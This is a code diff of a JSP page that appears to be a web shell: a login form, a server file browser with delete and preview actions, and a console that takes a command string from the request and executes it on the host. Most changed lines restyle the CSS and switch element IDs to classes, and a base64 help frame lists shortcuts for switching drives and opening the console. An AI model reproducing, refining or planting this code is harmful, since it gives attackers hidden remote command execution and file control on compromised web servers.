@@ -1,7 +1,5 @@
-<%@page import="java.util.zip.GZIPOutputStream"%>
 <%@page import="java.util.Set"%>
 <%@page import="java.util.Map.Entry"%>
-<%@page import="java.util.Iterator"%>
 <%@page import="java.util.HashMap"%>
 <%@page import="java.net.URI"%>
 <%@page import="java.net.URL"%>
@@ -44,53 +42,76 @@
 <head>
 <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
 <title> </title>
-
 <style type="text/css">
- *{position:relative;}
- body{
-	 color:black;
-	 font:18px red 微软雅黑;
-	 background-color:#FAFAD2;
-	 background-repeat:space;
-	 background-size:100% 1920px;
-	 background-attachment:scroll;
- }
- table{
-     width:80%;
-	 margin-top:0;
-	 cellspacing:0;
-	 cellpadding:0;
-	 margin-left:10%;
-	 margin-right:10%;
-	 border-spacing:0;
-	 border:1px #B0C4DE solid;
- }
- td{
- 	height:21px;
- 	color:black;
- 	text-align:left;
- 	padding-left:20px;
- 	border:1px #B0C4DE solid;
- }
- a:active{color:yellow}
- a:link:hover{color:red}
- a:visited{color:black}
- a:link{color:black; text-decoration:none}
- h3{margin-left:39%; top: 50px;}
- tr:hover{background-color: red}
-
-
- textarea[rows='30']{position:relative ;top:26px;left: 10% ;width:79.5%;}
- .list{position:relative;top:0}
- .filelist{position:absolute;top:-1px}
- .img{position: relative;top:26px;left:10%;}
- .login{position: relative;margin-left: 38%; margin-top: 10%;}
- .login>input[type='submit']{position: relative;left: 13%;top:20px }
- #helpDiv,#CommandDiv{width:80%;margin-left:10%;margin-right:10%;margin-top:0;display:none;}
- #CommandDiv>textarea{width: 100%}  
- /*  #file{color:yellow;background-color:red;} */
-/*  #folder{color:red;background-color:yellow} */
-
+	 *{position:relative;}
+	 a:visited{color:black}
+	 a:active{color:yellow}
+	 a:link:hover{color:red}
+	 a:link{
+	 	 color:black; 
+	 	 text-decoration:none
+ 	 }
+ 	 body{
+		 color:black;
+		 font:18px red 微软雅黑;
+		 background-color:#FDF5E6;
+		 background-repeat:space;
+		 background-size:100% 1920px;
+		 background-attachment:scroll;
+ 	 }
+ 	 table{
+	     width:80%;
+		 margin-top:0;
+		 cellspacing:0;
+		 cellpadding:0;
+		 margin-left:10%;
+		 margin-right:10%;
+		 border-spacing:0;
+		 border:1px #ffd9b3 solid;
+ 	 }
+	 td{
+	 	height:21px;
+	 	color:black;
+	 	text-align:left;
+	 	padding-left:20px;
+	 	border:1px #ffd9b3 solid;
+ 	}
+ 	.helpDiv,.CommandDiv{
+	 	width:80%;
+	 	margin-top:0;
+	 	display:none;
+	 	margin-left:10%;
+	 	margin-right:10%;
+ 	}
+ 	textarea{
+ 	 	background-color: #FDF5E6;
+ 	}
+  	textarea[rows='30']{
+	 	top:26px;left: 10% ;
+	 	width:79.5%;
+ 	}
+ 	textarea[rows='33']{
+ 		width: 100%
+ 	}
+ 	.login{
+	  	margin-left: 38%;
+	  	margin-top: 10%;
+  	}
+ 	.login>input[type='submit']{
+	 	left: 13%;
+	 	top:20px
+	}
+	h3{
+		margin-left:39%;
+		top: 50px;
+	}
+	tr:hover{
+		background-color: #ffbf80
+		}
+ 	.filelist{top:-2px}
+ 	.img{top:26px;left:10%;}
+ 	/*#file{color:yellow;background-color:red;} */
+ 	/*#folder{color:red;background-color:yellow} */
 </style>
 <script src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"> </script>
 <script type="text/javascript">
@@ -102,10 +123,11 @@
 		namecol.innerHTML=inhtml;
 	}
 	function switchDiv(KeyCode) {
-		var inx=$("#CommandDiv").children("input").get(0);
+		var inx=$(".CommandDiv").children("input").get(0);
 		var fileList=$(".fileListTable");
-		var Command=$("#CommandDiv");
-		var help=$("#helpDiv");
+		var Command=$(".CommandDiv");
+		var help=$(".helpDiv");
+		var showdoc=$("textarea[rows='30']");
 		if (KeyCode==88) {
 			if(	help.css("display") == "none"){
 				help.css("display","block");
@@ -119,12 +141,14 @@
 			if(fileList.css('display') == "block"){
 				help.css("display","none");
 				Command.css('display','block');
-				fileList.css('display','none'); 
+				fileList.css('display','none');
+				showdoc.css('display','none');
 				inx.value="";
 			 	inx.focus();
 			}else{
 				help.css("display","none");
 				Command.css('display','none');
+				showdoc.css('display','block');
 				fileList.css('display','block');
 			}
 		}
@@ -141,8 +165,8 @@
 		inx.focus();
 	}
 	window.onload=function(){
-		 $("tr:even").css('background-color','#FDF5E6');	 
-		 $("tr:odd").css('background-color','#FAFAD2');
+		 $("tr:even").css('background-color',' #fff2e5');	 
+		 $("tr:odd").css('background-color','#FDF5E6');
 		 switchDiv();
 		 switchDiv();
 		 var index=0;
@@ -314,7 +338,6 @@
 		}catch(Exception e){}
 		return x;
 	}
-	 
 	static String decode(String x){//url解码
 		try{
 		    x=URLDecoder.decode(x,"utf-8");
@@ -392,7 +415,6 @@
 				}
 			}
 		}
-	 
 		public static int locateEnd(byte[] bytes, int start, int end, String endStr) { //计算文件结束符的位置
 			byte[] endByte = endStr.getBytes();
 			
@@ -416,7 +438,6 @@
 	
 			return 0;
 		}
-		 
 		private static byte[] subBytes(byte[] b, int from, int end) {
 			byte[] result = new byte[end - from];
 			System.arraycopy(b, from, result, 0, end - from);
@@ -607,9 +628,7 @@
 		    	System.out.println("调用系统命令删除"+re);
 		    }
 		    req.getRequestDispatcher(url+"?dir="+ encode(f.getParent())+"&action=list").forward(req, res);
-		   
 		} else if(action.equals("preview") ){ 
-		 
 		    System.out.println("预览文件");
 		    String type=fileType(dir );
 		    System.out.println(type);
@@ -625,7 +644,6 @@
 			}
 		}
 	}
- }
 if(cmdStr!=null){
 		System.out.println("执行命令"+cmdStr);
 		if(cmdStr.startsWith("cd")){
@@ -638,11 +656,11 @@ if(cmdStr!=null){
 	}
  %>
    </table></div> 
-<div id="CommandDiv"><input type="text" name="commandStr"><input type="submit" onclick="sendCommand(this.previousSibling)"><textarea rows='33'></textarea>
+<div class="CommandDiv"><input type="text" name="commandStr"><input type="submit" onclick="sendCommand(this.previousSibling)"><textarea rows='33'></textarea>
 </div>
-<div id="helpDiv" >
+<div class="helpDiv" >
 <iframe src="data:text/html;charset=utf-8;base64,PHVsPjxsaT5zaGlmdCtDL0QvRS9GL0cvSCDot7PliLDlr7nlupTnm5jnrKYgPC9saT48bGk+c2hpZnQrQS82NjYg5YiH5o2i5paH5Lu25YiX6KGo5LiO5o6n5Yi25Y+wIDwvbGk+PGxpPnNoaXRmK1gg5biu5YqpPC9saT48L3VsPg==" frameborder="0"></iframe>
-
+<%} %>
  </div>							  
 </body>
 </html>
